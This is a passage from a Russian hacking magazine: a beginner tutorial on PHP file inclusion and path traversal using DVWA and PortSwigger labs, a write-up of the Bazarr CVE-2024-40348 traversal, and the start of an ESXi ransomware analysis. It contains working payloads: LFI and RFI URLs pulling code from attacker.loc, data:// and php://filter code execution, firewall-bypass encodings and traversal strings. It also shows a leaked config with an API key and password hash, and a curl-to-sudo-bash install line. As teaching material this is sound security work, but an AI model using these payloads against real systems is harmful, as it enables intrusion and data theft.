с  самого  начала  рассмотрим,  как они
работают, и научимся их эксплуатировать
в рамках лабораторных работ, а потом пос‐
мотрим на недавний пример — уже совер‐
шенно реальный.


             INFO

                      Эта  статья  ориентирована  в  первую  очередь
                       на новичков и рассказывает о двух простейших
                            уязвимостях. Если этот уровень для тебя слиш‐
                     ком  легкий,  не  спеши  уходить —  пролистай
                      до разбора бага в Bazarr в конце статьи.



ВКЛЮЧЕНИЕ ФАЙЛОВ (FILE INCLUSION)

Включение файлов (File Inclusion) — это тип уязвимости, который возникает,
когда веб‑приложение позволяет пользователю загружать и исполнять фай‐
лы. Такие уязвимости особенно опасны, так как дают злоумышленнику воз‐
можность выполнить произвольный код на сервере.
  Под включением файлов обычно подразумевают подключение внешних
библиотек или модулей (на английском эта директива обычно называется
include — «включать»). В разных языках программирования этот механизм
реализован немного по‑разному. В этой статье мы будем рассматривать
в основном примеры на PHP, поэтому давай подробно разберем реализацию
в этом языке.
   Вот что делает интерпретатор PHP, когда находит директиву include:
 • Ищет файл в файловой системе: либо указанный файл должен най‐
   тись в том же каталоге, что и основная программа, либо каталог с подклю‐
  чаемым модулем должен быть перечислен в переменной окружения PATH.
 • Читает файл: PHP считывает содержимое файла. Обычно это HTML,
   CSS, JavaScript или код на PHP.
 • Включение: PHP берет содержимое файла и буквально помещает его
   в текущий скрипт прямо в том месте, где находится оператор включения.
 • Выполнение кода: как только код из включенного файла будет помещен
   на место, PHP продолжит обработку сценария, как если бы весь этот код
  был изначально в том же файле.


ТИПЫ ВКЛЮЧЕНИЯ ФАЙЛОВ

Локальное включение файлов (Local File Inclusion, LFI) происходит, когда при‐
ложение загружает файлы с сервера, при этом в процессе выбора файла
используются данные, которые ввел пользователь.
   Эту уязвимость можно использовать для доступа к конфиденциальной
информации — например, можно запросить файл с настройками или с
паролями. А еще таким образом можно запустить размещенный на сервере
скрипт.
   Давай разберем простейший пример:


<?php
$file = $_GET['file'];
include($file);
?>

Здесь злоумышленник может передать в параметре file путь к любому фай‐
лу на сервере, например:


http://xakep.loc/index.php?file=/etc/passwd

Это приведет к включению содержимого файла /etc/passwd в ответ, который
отобразится в браузере.
   Дальше для демонстрации уязвимости я буду использовать DVWA — «чер‐
товски уязвимое веб‑приложение». Это написанный на PHP тренировочный
стенд с разными видами уязвимостей. Скачиваем его:


sudo bash -c "$(curl --fail --show-error --silent --location https://
raw.githubusercontent.com/IamCarron/DVWA-Script/main/Install-DVWA.sh)
"


DVWA LEVEL LOW

Сперва нам нужно выбрать уровень, для этого заходим в DVWA Security,
выбираем там Low и нажимаем Submit. Затем нажимаем File Inclusion.





Наверху перечислены файлы: file1.php, file2.php, file3.php. Если клик‐
нуть на какой‑то из них, он откроется, и адрес страницы будет таким: {url}/?
page=file1.php.





Если нажать на кнопку View Source внизу справа, то откроется исходный код
приложения.





Почему здесь нет include? Исходник, который мы видим, принимает имя
файла через URL, и в коде приложения оно добавляется как параметр
для include, выглядит это так:


file: vulnerabilities/fi/index.php:
if( isset( $file ) )
    include( $file );
else {
    header( 'Location:?page=include.php' );
    exit;
}

Уязвимость здесь в том, что в качестве имени файла без всякой проверки
берется переданный браузером параметр. Мы можем вписать в page наз‐
вание другого файла на сервере и таким образом посмотреть его содер‐
жимое.


http://xakep.loc/DVWA/vulnerabilities/fi/?page=/etc/passwd





Правда, в реальной жизни дело почти никогда не в чтении /etc/passwd —
файла со списком пользователей ОС на веб‑сервере. Чаще всего развитием
атаки становится либо RCE (удаленное выполнение кода на сервере), либо
получение других чувствительных данных, хранящихся на сервере. Это могут
быть бэкапы, конфиги и прочее. Например, в DVWA есть файл database/
sqli.db.dist с данными пользователей.




КАК УЗНАТЬ, ГДЕ КАКИЕ ФАЙЛЫ? КАК ПОЛУЧИТЬ RCE?

Большую помощь нам окажут фильтры PHP. В этом языке так называются
обработчики потоков данных. Они позволяют читать, записывать и преобра‐
зовывать информацию.
   Обертки потоков (wrappers) — это набор  протоколов, которые PHP
использует для обработки данных из разных источников и хранилищ. Эти
обертки определяют, как данные будут доступны и как с ними взаимодейство‐
вать. Примеры оберток:
 • file://: — дает доступ к файлам на локальной файловой системе;
 • data://: —  позволяет PHP  обрабатывать  данные, закодированные
   непосредственно в URL. Поддерживает несколько схем:
    • data://text/plain — позволяет включать данные в текстовом фор‐
      мате;
    • data://image/png;base64 —  позволяет включать данные изоб‐
     ражения в формате Base64;
 • php://: — дает доступ к внутренним потокам PHP. Имеет несколько схем,
   но нас интересует только одна:
    • php://filter — позволяет применять фильтры к потоку данных.
      Фильтры могут использоваться для преобразования данных по мере их
      чтения или записи для кодирования, декодирования, сжатия или рас‐
      паковки.

Популярные фильтры:
 • convert.base64-encode — кодирует данные в Base64;
 • convert.base64-decode —  декодирует  данные,  закодированные
   в Base64;
 • string.rot13 — применяет к данным кодировку ROT13.

После фильтра должен быть указан resource — источник, к которому будет
применяться действие.
   Вот для примера самый простой фильтр:


http://xakep.loc/DVWA/vulnerabilities/fi/?page=file:///etc/passwd

Здесь в параметре page указано file:///etc/passwd, что заставляет сер‐
вер обрабатывать значение как абсолютный путь к файлу на локальной фай‐
ловой системе.





Перейдем к более интересному фильтру — data://. Внутри него мы можем
написать  код, который будет исполнен. Давай напишем  однострочник,
показывающий вывод функции phpinfo. Это поможет узнать  настройки
интерпретатора PHP, который работает на сервере.
   Можем отправить вот такой запрос:


http://xakep.loc/DVWA/vulnerabilities/fi/?page=data:text/plain,<?php
phpinfo(); ?>





В ответ мы должны получить результат выполнения кода на PHP — как на
скриншоте.
   Через эту уязвимость можно легко выполнять и другие команды на сер‐
вере. Например:


http://xakep.loc/DVWA/vulnerabilities/fi/?page=data:text/plain,%3C?
php%20system(%27id%27);%20?%3E




Мы выполняем команду <?php  system('id');  ?>, которая выведет нам
информацию о пользователе.


             INFO

                      Здесь используется URL-кодирование: все спе‐
                         циальные символы записаны как коды после зна‐
                         ка процента. В нашем примере %20 — это про‐
                         бел, %27 — одинарная кавычка, а %3C и %3E —
                       открывающая и закрывающая треугольные скоб‐
                           ки.


Ты спросишь: если все так прекрасно работает, зачем нам еще какой‑то
php://filter? Есть две основные причины его использовать:
 1. Схема data://: может быть отключена на сервере.
 2. Если на сервере используется веб‑файрвол, то он заблокирует наш зап‐
   рос, потому что строка exec/phpinfo будет у него в черном списке.

Причем опасные строки могут быть в блеклисте не только в открытом виде,
но и в закодированном, например в Base64. В таком случае мы можем схит‐
рить и закодировать нашу нагрузку несколько раз подряд. Какой‑нибудь
вариант да поможет обойти проверку.
   Получается вот такая цепочка.
   Исходная строка:


<?php phpinfo(); ?>

Кодируем ее в Base64:


PD9waHAgcGhwaW5mbygpOyA/Pg==

А потом кодируем в Base64 еще раз:


UEQ5d2FIQWdjR2h3YVc1bWJ5Z3BPeUEvUGc9PQ==

Вот в таком виде нагрузка уже обходит фильтрацию:


data://plain/text,UEQ5d2FIQWdjR2h3YVc1bWJ5Z3BPeUEvUGc9PQ==

Нам осталось ее дважды декодировать перед запуском. Для этого исполь‐
зуем функцию convert.base64-decode. Получается такой пейлоад:


php://filter/convert.base64-decode/convert.base64-decode/
resource=data://plain/text,UEQ5d2FIQWdjR2h3YVc1bWJ5Z3BPeUEvUGc9PQ==

Возьмем такой запрос:


http://xakep.loc/DVWA/vulnerabilities/fi/?page=php://filter/convert.
base64-decode/convert.base64-decode/resource=data://plain/text,
UEQ5d2FIQWdjR2h3YVc1bWJ5Z3BPeUEvUGc9PQ==

Отправив его, видим результат выполнения нашей команды.





Главное здесь — понимать разобранные нами возможности самой функции
include в PHP. Если же ты можешь загрузить PHP-файл на сервер, то филь‐
тры уже не понадобятся — можно будет напрямую указать этот файл и выпол‐
нить его.


УДАЛЕННОЕ ВКЛЮЧЕНИЕ ФАЙЛОВ (REMOTE FILE INCLUSION, RFI)

Удаленное включение файлов отличается от LFI тем, что позволяет загружать
файлы с удаленных серверов. Это особенно опасно, так как злоумышленник
может загрузить и исполнить произвольный код, находящийся на другом сер‐
вере.
   Снова рассмотрим простейший код на PHP, где происходит включение
файла в код.


<?php
$file = $_GET['file'];
include($file);
?>

Предположим, ссылка на файл передается через URL, тогда злоумышленник
может менять этот URL, как ему вздумается. Например, передать адрес, ука‐
зывающий на подконтрольный ему ресурс:


http://xakep.loc/index.php?file=http://attacker.loc/pwn.php

В этом случае будет загружен и выполнен вредоносный код с сервера зло‐
умышленника. Пользоваться такой уязвимостью куда проще, чем LFI.
   Создаем файл с кодом на PHP.



  $ mkdir phpc
  $ cd phpc
  $ echo '<?php phpinfo(); ?>' > code.php
  $ python3 -m http.server 1337
  Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...


Отправляем запрос к нашему удаленному файлу:


http://xakep.loc/DVWA/vulnerabilities/fi/?page=http://server.loc:
1337/code.php





DVWA взял наш код и включил его! Одновременно мы можем увидеть, как на
наш сервер пришел запрос.


127.0.0.1 - - [25/Aug/2024 12:42:10] "GET /code.php HTTP/1.1" 200 -

Если RFI по какой‑то причине не срабатывает, можно попробовать простой
метод обхода: например, вместо http написать htTp.


УЯЗВИМОСТИ, СВЯЗАННЫЕ С СИМВОЛОМ NULL BYTE (PHP 5)

До выхода PHP версии 5.3.4 символ null byte (%00) можно было использовать
для обхода фильтрации путей. Нулевой байт во многих языках добавляется
в конец строки, чтобы при ее чтении из памяти программа знала, где оста‐
новиться. Это позволяло злоумышленнику обрывать строку искусственно.
   Разберем такой код:


<?php
$file = $_GET['file'] . ".php";
include($file);
?>

Здесь к присланной строке добавляется расширение .php. Это мешало бы
нам запросить файл /etc/passwd, поскольку у него такого расширения нет.
Но если добавить в строку нулевой байт, то интерпретатор PHP не будет
читать ее дальше: для него строка теперь заканчивается там, где мы пос‐
тавили %00.
  Для знакомства с этой уязвимостью я рекомендую лабораторную работу
File path traversal, validation of  file extension with  null byte bypass с сайта
PortSwigger.
   Вообще, когда нужно попентестить какой‑то сервис, независимо от типа
пентеста (black box, white box, grey box) я горячо рекомендую первым делом
прикинуть, какие вообще возможны уязвимости. Видишь запрос продукта
по ID? Возможно, тут есть SQLi, XSS или SSTI. Видишь параметр, который
принимает файлы? Тогда целимся в File Inclusion, Path Traversal, SQLi, XSS
и RCE.
  Не забываем о том, что все запросы наверняка логируются и логи
еще сильнее расширяют поверхность атаки, так как это еще один способ
передать что‑то, что будет сохранено на сервере.
   Итак, в лабораторной работе нам дано приложение, где мы можем нажать
на одну из фотографий. После этого будет сделан запрос на такой адрес:


https://0ad50027046d1ebc814175a3006800c9.web-security-academy.net/
image?filename=58.jpg

Здесь
 • путь — image;
 • параметр — filename;
 • имя файла — цифры;
 • расширение файла — .jpg (фотка).

Тут у тебя в голове уже должны всплывать идеи о том, как это эксплуатировать
и какие будут пейлоады. Например:
 • /etc/passwd;
 • ../../../../../../etc/passwd.

Вполне возможно, что сервис ожидает файлы с расширением, характерным
для картинок. В таком случае можно попробовать такие варианты:
 • /etc/passwd%00.jpg;
 • ../../../../../../etc/passwd%00.jpg .

Последний пейлоад сработает, и мы сможем увидеть содержимое /etc/
passwd со списком пользователей. Если ты еще не знаешь, что это за стран‐
ная последовательность из точек и слешей, то читай дальше — как раз ее мы
с тобой сейчас разберем.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
       FILE INCLUSION
   И PATH TRAVERSAL
         РАЗБИРАЕМ ДВЕ БАЗОВЫЕ ВЕБ-
                      УЯЗВИМОСТИ





ОБХОД ПУТЕЙ (PATH TRAVERSAL)

Обход путей (Path Traversal) — это уязвимость, которая возникает, когда поль‐
зователь может манипулировать путем к файлу и выходить за пределы
каталога приложения. Это позволяет получить доступ к системным файлам.
   Возьмем для примера простейший код:


<?php
$filename = $_GET['filename'];
$file = fopen('/var/www/html/uploads/' . $filename, 'r');
?>

Злоумышленник может передать параметр filename=../../../../etc/
passwd, чтобы получить доступ к файлу /etc/passwd. Последовательность ..
/ означает переход на один уровень вверх в структуре каталогов. Четыре пос‐
ледовательных ../ переходят от /var/www/html/uploads/ к корню фай‐
ловой системы, после чего пишем обычный путь к файлу.
  В чистом виде такая уязвимость встречается все реже: в современных
веб‑приложениях обычно все же есть защита от этого. Но, угадав, как такая
защита устроена, мы можем попробовать ее обойти.
   Вот несколько техник, которые используются для борьбы с Path Traversal,
и сразу — идеи для противодействия им.
 • Приложение ищет в адресе последовательности символов ../ и удаляет
   их. Тогда просто возьмем и поставим побольше точек и слешей. Так, что‐
  бы после удаления как раз получился нормальный путь:
    • /etc/passwd — абсолютный путь.
    • ../../../etc/passwd — обычный Path Traversal.
    • ....//....//....//etc/passwd — вариант с удвоением, который
    мы передаем. После единоразового удаления ../ третья строка прев‐
      ратится во вторую, то есть как раз то, что нам нужно.
 • Приложение может разрешать  только  пути, в которых есть какая‑то
   заранее известная часть. Например, /var/www/html — каталог, где раз‐
  мещен веб‑сервер. В таком случае нам нужно будет начать путь с него,
   а   дальше   выйти   в   корень   файловой   системы:  /var/www/
  html/../../../etc/passwd
 • Приложение читает только файлы с определенным расширением. До вер‐
   сии 5.3.4 в этом случае помогал нулевой байт. Как это работает, мы уже
   рассмотрели выше.

Давай посмотрим, как работают эти нагрузки, на примере еще одной лабы
с PortSwigger: File path traversal, traversal sequences stripped non-recursively.
  Я рекомендую поэкспериментировать с ней самостоятельно, но, если
вдруг возникнут сложности, можешь подсмотреть решение в тексте ниже.
  Я буду перебирать строчки из файла payloads.txt со списком пейлоадов
и делать для каждой запросы при помощи curl:


$ cat payloads.txt | xargs -I{} sh -c 'echo "\n{}\n" && curl
"https://xakep.web-security-academy.net/image?filename={}"'

Вот как будет выглядеть результат:



  /etc/passwd%00.jpg


  "No such file"


  ../../../../../../etc/passwd%00.jpg


  "No such file"


  /etc/passwd


  "No such file"


  ....//....//....//etc/passwd


  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  sync:x:4:65534:sync:/bin:/bin/sync
  games:x:5:60:games:/usr/games:/usr/sbin/nologin
  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin


  /var/www/html/../../../etc/passwd


  "No such file"


В результате пейлоад ....//....//....//etc/passwd успешно сработал.


ЗАЩИТА ОТ УЯЗВИМОСТЕЙ

Итак, Path Traversal позволяет манипулировать путями, чтобы получить доступ
к файлам вне разрешенной директории (читает файл), а File Inclusion поз‐
воляет включать и выполнять произвольные файлы на сервере  (читает
и выполняет).
   Давай взглянем на проблему глазами разработчиков веб‑приложений
и разберем две самые распространенные формы защиты от этих уязвимос‐
тей.


Валидация и фильтрация пользовательских данных
Если у нас есть список разрешенных файлов, то можем каждый раз при зап‐
росе страницы пробегаться по нему и проверять, соответствует ли параметр
одному из вариантов.


<?php
$allowed_files = ['file1.php' , 'file2.php'];
if (in_array($_GET['file'] , $allowed_files)) {
    include($_GET['file']);
} else {
    die('Доступ запрещен');
}
?>

По сути, это просто белый список — крайне распространенный метод
защиты.


Использование функции realpath
Функция realpath возвращает канонический путь, убирая из него пос‐
ледовательности ../. Это позволяет предотвратить обход путей:


<?php
$path = realpath('/var/www/html/uploads/' . $_GET['filename']);
if (strpos($path, '/var/www/html/uploads/') === 0) {
    $file = fopen($path, 'r');
} else {
    die('Недопустимый путь');
}
?>


BAZARR

От теории и простейших примеров переходим к реальной  уязвимости,
в которой используются разобранные нами техники. Если выше ты читал
о новых для себя вещах, то, возможно, скачок в сложности будет немного
слишком крутым, к тому же код будет не на PHP, а на Python.
  Тем не менее полезно иногда посмотреть, как баги, о которых мы говори‐
ли, выглядят «в природе» и в современных условиях. Если будет много
непонятного — не переживай, эта секция для тебя опциональная.


Неизвестный баг
Недавно я решил создать сервис для сортировки CVE и случайно напал
на уязвимость, которая какое‑то время оставалась неизвестной из‑за того,
что багхантер неправильно написал название продукта. Программа пред‐
назначена для скачивания субтитров и называется Bazarr, а в базу данных
CVE уязвимость записали, указав Bazaar. Получается, что это редчайший слу‐
чай бага нулевого дня, для которого есть CVE.


Анализ без установки
Вот как выглядит эксплуатация бага CVE-2024-40348 в Bazarr:


http://xakep.loc:6767/api/swaggerui/
static/../../../../../../../../../../../../../../../../etc/passwd

При виде этой ссылки у меня, естественно, возник вопрос, почему путь
начинается именно с api/swaggerui/static. И тогда я наткнулся на CVE-
2023-50265. Из описания выясняется, что продукт был уязвим к Path Traversal,
затем уязвимость пофиксили, но после фикса он все равно остался уяз‐
вимым.
   Наше дело — найти, в чем именно была ошибка. Для этого обычно дос‐
таточно прочитать код, но мы все равно поднимем стенд, чтобы сразу потес‐
тировать работу бага.


Поднимаем Bazarr
Инструкция по установке программы есть в вики проекта. У меня Bazarr уста‐
новлен на сервере, а VSCode — на рабочем компьютере. Поэтому нам
понадобится подключить отладчик удаленно.
   Устанавливаем отладчик:


pip3 install ptvsd

Открываем /opt/bazarr/app/app.py, после импортов добавляем такой код:


import ptvsd


ptvsd.enable_attach(redirect_output= True)
print("Велком, плиз коннект зе отладчик")
ptvsd.wait_for_attach()

Теперь на компьютере, где установлен VSCode, выполняем такую команду
(192.168.0.1 — IP сервера, где установлен Bazarr):


rsync -azP root@192.168.0.1:/opt/bazarr /home/debian

Команда скачивает содержимое /opt/bazarr в /home/debian.


Отладка
Нам нужно открыть папку, в которую мы все скачали. В VSCode жмем File →
Open Folder и указываем /home/debian/bazarr.
   Выбираем Python как дебаггер.





Выбираем Remote Attach.





Пишем IP.





Порт по дефолту — 5678.





В создавшемся файле ищем remoteRoot и указываем директорию bazarr
на нашем сервере.





Нажимаем зеленую кнопку «Старт» вверху слева.





Анализ CVE-2024-40348
У нас есть патч для уязвимости CVE-2023-50265, так что мы знаем, где она
в коде. Но давай представим, что таких данных у нас нет и мы должны разоб‐
раться сами. PoC будет такой:


http://xakep.loc:6767/api/swaggerui/
static/../../../../../../../../../../../../../../../../etc/passwd

Самое простое, что мы можем сделать, — это поискать api/swaggerui/
static.





В итоге уязвимости сами нас нашли через отладчик. Давай начнем с провер‐
ки функции swaggerui_static:


@ui_bp.route('/api/swaggerui/static/<path:filename>', methods=['GET']
)
def swaggerui_static(filename):
    basepath = os.path.join(os.path.dirname(os.path.dirname(os.path.
dirname(__file__))), 'libs', 'flask_restx',
                            'static')
    fullpath = os.path.join(basepath, filename)
    if not fullpath.startswith(basepath):
        return '', 404
    else:
        return send_file(fullpath)

Вот что происходит в этой функции:
 • @ui_bp.route —  декоратор  Flask, который  связывает URL /api/
  swaggerui/static/<path:filename>          с            функцией
  swaggerui_static. Когда клиент отправляет GET-запрос на этот адрес,
   Flask вызывает соответствующую функцию.
 • <path:filename> — это переменная в URL, которая позволяет переда‐
   вать путь к нужному файлу.
 • Функция swaggerui_static принимает один аргумент — filename.
   Это имя файла, который клиент хочет получить.
 • basepath = os.path.join... — эта строка формирует базовый путь
   к каталогу, где хранятся статические файлы Swagger UI. Она поднимается
   на два уровня вверх от текущего файла (__file__) (из /opt/bazarr/
  bazarr/app/ui.py в /opt/bazarr), а затем добавляет к пути дирек‐
   тории      libs/flask_restx/static           (/opt/bazarr/libs/
  flask_restx/static).
 • os.path.dirname(__file__) — возвращает директорию, в которой
   находится текущий файл.
 • os.path.dirname(os.path.dirname(__file__)) —  поднимается
   на один уровень вверх.
 • os.path.dirname(os.path.dirname(os.path.dirname(
  __file__))) — поднимается еще на один уровень вверх.

Разбираем дальше по одной строке.


fullpath = os.path.join(basepath, filename):

Здесь  создается полный  путь  к  запрашиваемому  файлу:  объединяется
базовый путь и переданное имя файла filename.


if not fullpath.startswith(basepath)::

Тут программа проверяет, начинается ли полный путь fullpath с базового
пути basepath. Это важно для предотвращения атаки путем выхода из катало‐
га (Path Traversal). Но тут возникает проблема. Представь, что пользователь
запросил вот такой путь:


../../../../../../../etc/passwd

Тогда fullpath будет таким:


/opt/bazarr/libs/flask_restx/static/../../../../../../../etc/passwd

А basepath — таким:


/opt/bazarr/libs/flask_restx/static

Поскольку fullpath и так начинается с basepath, это даст возможность экс‐
плуатировать уязвимость.


return '', 404:

Если файл находится за пределами разрешенной директории, функция воз‐
вращает HTTP-ответ с кодом 404 (не найдено) и пустым телом. Но поскольку
файл и так начинается с /opt/bazarr..., эта часть будет просто проигно‐
рирована.


else: \n return send_file(fullpath):

Функция возвращает файл по пути fullpath клиенту, используя функцию
send_file из Flask.
   Давай попробуем прочитать какой‑нибудь файл, воспользовавшись этой
уязвимостью. Сперва нам нужно поставить точку останова.





После переходим в Burp Suite и отправляем запрос по такому адресу:


/api/swaggerui/static/../../../../../../../etc/passwd





Как видишь, fullpath начинается с basepath, из‑за этого вместо 404 сра‐
ботал send_file. Нажимаем кнопку «Старт» в VSCode и убираем точку оста‐
нова.


Что интересного можно прочесть?
Чаще всего цель — это приватный ключ SSH. Но в нашем случае я бы пред‐
почел чекнуть конфиги приложения:



  $ find . -name config*
  ./libs/pydantic/config.py
  ./libs/future/moves/configparser.py
  ./libs/knowit/__pycache__/config.cpython-38.pyc
  ./libs/knowit/config.py
  ./libs/guessit/test/config
  ./libs/guessit/config
  ./libs/apprise/config
  ./libs/test/configuration_test.py
  ./libs/pygments/lexers/configs.py
  ./libs/mako/testing/config.py
  ./libs/dynaconf/vendor/box/__pycache__/config_box.cpython-38.pyc
  ./libs/dynaconf/vendor/box/config_box.py
  ./libs/dynaconf/vendor/ruamel/yaml/configobjwalker.py
  ./libs/sqlalchemy/testing/config.py
  ./libs/flask/__pycache__/config.cpython-38.pyc
  ./libs/flask/config.py
  ./libs/alembic/__pycache__/config.cpython-38.pyc
  ./libs/alembic/config.py
  ./libs/trakit/__pycache__/config.cpython-38.pyc
  ./libs/trakit/config.py
  ./libs/trakit/data/config.json
  ./bazarr/app/__pycache__/config.cpython-38.pyc
  ./bazarr/app/config.py
  ./data/config
  ./data/config/config.yaml


  $ cat ./data/config/config.yaml
  ---
  addic7ed:
    cookies: ''
    password: ''
    user_agent: ''
    username: ''
    vip: false
  analytics:
    enabled: true
  anidb:
    api_client: ''
    api_client_ver: 1
  animetosho:
    anidb_api_client: ''
    anidb_api_client_ver: 1
    search_threshold: 6
  anticaptcha:
    anti_captcha_key: ''
  assrt:
    token: ''
  auth:
    apikey: 54df08bfef4e16efa74950bd8a511f15
    password: 21232f297a57a5a743894a0e4a801fc3
    type: form
    username: admin


Среди настроек нашелся хеш пароля админа. Получается, что мы через LFI
получили доступ к админке. Это и есть 0-day-уязвимость, о которой раз‐
работчик не знает и не узнает, пока ему кто‑нибудь не напишет.
   Функция backup_download была исправлена в патче. Давай посмотрим,
как именно.


@ui_bp.route('/system/backup/download/<path:filename>', methods=['GET
'])
def backup_download(filename):
    fullpath = os.path.normpath(os.path.join(settings.backup.folder,
filename))
    if not fullpath.startswith(settings.backup.folder):
        return '', 404
    else:
        return send_file(fullpath, max_age=0, as_attachment=True)

Здесь вызывается normpath — функция, которая нормализует путь. Нор‐
мализация значит, что он будет упрощен и все избыточные, но дорогие нам
хождения по каталогам исчезнут.
   Вот как это работает:


import os


path = "/home/user/../user2/./file.txt"
normalized_path = os.path.normpath(path)
print(normalized_path)
# Вывод: /home/user2/file.txt

В этом примере normpath преобразует путь /home/user/../user2/./file.
txt в /home/user2/file.txt. Избыточные элементы исчезнут.
   Несмотря на «защиту», проблема все еще есть, так как злоумышленник
может перебирать имя файла бэкапа.
   bazarr_backup_v1.4.3_2024.08.18_16.02.12.zip
   Перебирать нужно 2024.08.18_16.02.12.
  В худшем случае понадобится от 2 (бэкап раз в месяц) до 31 (бэкап раз
в год) миллиона запросов.


ВЫВОДЫ

В этой статье я показал основные типы LFI и Path Traversal и их примеры
в коде на PHP. Затем мы посмотрели, как избегать таких уязвимостей, а в кон‐
це разобрали  интересный баг CVE-2024-40348 в реальной программе
на Python. Как видишь, баги иногда сохраняются даже после исправлений,
если код не подвергся тщательному тестированию.
ВЗЛОМ





Целью    атаки    трояна‑шифровальщика
может   стать   не   просто   компьютер
или работающий в сети сервер, а виртуаль‐
ная   машина    уровня    предприятия,
на которой обычно крутится очень много               Gerion                                                                                                   gerionill@gmail.com
важных сервисов. Сегодня мы разберем
принцип  действия шифровальщика, ори‐
ентированного на VMware ESXi, и погово‐
рим о том, как обезопасить свою виртуаль‐
ную инфраструктуру.


Компрометация гипервизора или связанной с ним инфраструктуры может
поставить под угрозу целую экосистему серверов, баз данных и бизнес‑при‐
ложений. Неудивительно, что хакерские группы все чаще фокусируют свои
атаки на VMware  ESXi,  создавая  специализированные программы‑шиф‐
ровальщики, нацеленные на файлы виртуальных машин, такие как *.vmdk, *.
vmx, *.vmsn, *.vswp, *.vmem и другие. Сегодня мы рассмотрим конкретный
случай, в котором был обнаружен бинарный ELF-файл с именем encrypt
и сопровождающий его Bash-скрипт encrypt.sh. Я подробно опишу этапы
атаки: от проникновения в сеть и получения доступа к ESXi до запуска файлов,
шифрования виртуальных дисков и устранения следов, что оставляет жертву
перед выбором — заплатить выкуп или потерять данные.


УЯЗВИМОСТЬ И ОБЩАЯ СХЕМА АТАКИ

Чтобы понять всю глубину этого инцидента, нужно рассмотреть последова‐
тельность действий атакующих от момента эксплуатации уязвимости CVE-
2021-44228 на VMware Horizon до непосредственного запуска шифрования
на ESXi. Уязвимость, получившая название Log4Shell, стала широко известна
зимой 2021–2022 годов и давала возможность злоумышленникам выполнять
произвольный код в контексте сервера, где используется логирующая биб‐
лиотека Log4j уязвимых версий. VMware Horizon, будучи сложным продуктом,
базирующимся на Java и в прошлом включавшим уязвимые компоненты,
иногда оставался непропатченным, что открывало возможность провести
RCE-атаку (remote code execution).
   Злоумышленник, имея специальный  эксплоит, мог переслать серверу
Horizon пакет, включавший вызов к JNDI с вредоносным классом. Библиотека
Log4j динамически загружала его и исполняла. Как только этот класс попадал
в среду исполнения, он раскрывал перед атакующим безграничные воз‐
можности — от установки дополнительного malware-инструментария до внед‐
рения скриптов и эскалации на уровень локального администратора. Именно
так, согласно собранным данным, в ряде случаев удавалось проникнуть
в корпоративную сеть и скомпрометировать сервер Horizon.
   После эксплуатации уязвимости CVE-2021-44228 атака не останавлива‐
ется на одной машине, ведь обычно злоумышленникам интересны более
масштабные цели. Поэтому они анализируют сетевую среду, отыскивают уяз‐
вимые узлы и, самое важное, осуществляют атаку SAM-хранилища в попытке
извлечь NTLM-хеш локального администратора. Если в компании на многих
серверах используется один и тот же пароль локального админа (или хотя бы
на нескольких ключевых машинах), это дает атакующим возможность переме‐
щаться по сети (lateral movement) при помощи pass-the-hash.
   Когда обнаруживается узел, где запущена сессия пользователя из группы
«Администраторы домена», то дамп lsass.exe или аналогичное средство
позволяет получить NTLM-хеш доменного админа, после чего злоумыш‐
ленники могут выполнить любые действия от имени доменного администра‐
тора, в том числе получить доступ к ESXi, если настроена аутентификация
через доменные учетные записи.
   Если учетка Domain Admin без жесткой изоляции тоже имеет право под‐
ключаться к ESXi, то злоумышленники этим непременно воспользуются, ведь,
овладев доменными привилегиями, они без труда загрузят нужную вредонос‐
ную программу в /tmp или другой каталог на гипервизоре (с помощью SCP
или иным способом). В нашем случае атакующие загружают файлы encrypt
и encrypt.sh — двух компонентов, которые действуют в связке.





                      Анализ VirusTotal файла encrypt.sh





                       Анализ VirusTotal файла encrypt





                    Анализ Cuckoo Sandbox файла encrypt




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
 ВИРТУАЛЬНЫЙ ШИФР
           АНАЛИЗИРУЕМ ЭНКОДЕР ДЛЯ
                      VMWARE ESXI





АНАЛИЗ ВРЕДОНОСНЫХ ФАЙЛОВ

Анализ   показал,   что   ELF-бинарь   encrypt   представляет   собой
модуль‑вымогатель, написанный под 64-битную Linux-платформу. В ESXi
внутренне используется Linux-образ, поэтому запуск ELF-файла напрямую
там возможен, особенно если установлен параметр execInstalledOnly = 0
(или скомпилированы нужные shared-библиотеки).





                         Параметры файла encrypt

Логика запуска файла encrypt — обработка ошибки, когда нет ссылки
на файл для шифрования. Если ссылка присутствует, то запускается процесс
шифрования.





                       Логика запуска шифровальщика

Бинарь при старте ждет от пользователя аргумента — пути к файлу, который
будет шифроваться. При этом, если верить дизассемблеру, в коде реали‐
зованы криптопримитивы Curve25519 (для обмена или генерации ключей)
и Sosemanuk (для быстрого шифрования). Давай разберем всю последова‐
тельность действий этой софтины.





                     Логика основной функции encrypt_file

Вот примерный пошаговый алгоритм выполнения функции.
 1. Открытие файла. Файл открывается для чтения и записи в бинарном
   режиме. Если открыть файл не удалось (fopen64 вернул NULL), функция
   возвращает 1.



                      Логика основной функции encrypt_file

 2. Выделение памяти под ключ и инициализация базы данных значениями.





     Выделение памяти под ключ и инициализация базы данных значени‐
    ями

 3. Декодирование строки Base64 и генерация ключа.



                Декодирование строки Base64 и генерация ключа

В коде можно найти вот такие константы:


ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/

Они используются для Base64 в процессе декодирования встроенной стро‐
ки‑ключа,  «вшитой»  прямо в бинарь. Исходная  длина decoded_length
записывается сюда же, прочитанная строка используется для генерации
нового ключа функцией generate_key.





                       Развернутая функция generate_key

Функция generate_key принимает шесть аргументов:
 • _int64 privateKey1 — первый приватный ключ для Curve25519;
 • _int64 privateKey2 — второй приватный ключ для Curve25519;
 • _BYTE  *sosemanukStateBuffer —  указатель на буфер состояния
  Sosemanuk (поточного шифра);
 • _BYTE *curve25519PrivateArray — указатель на 32-байтовый массив
   для работы с Curve25519;
 • _int64 sharedSecret1 — буфер для результата первого вызова фун‐
   кции curve25519_donna;
 • _int64 sharedSecret2 — буфер для результата второго вызова фун‐
   кции curve25519_donna.

Шаги выполнения этой части вредоносного приложения.
 • Очистка памяти. На этом этапе очищаются массивы для последующего
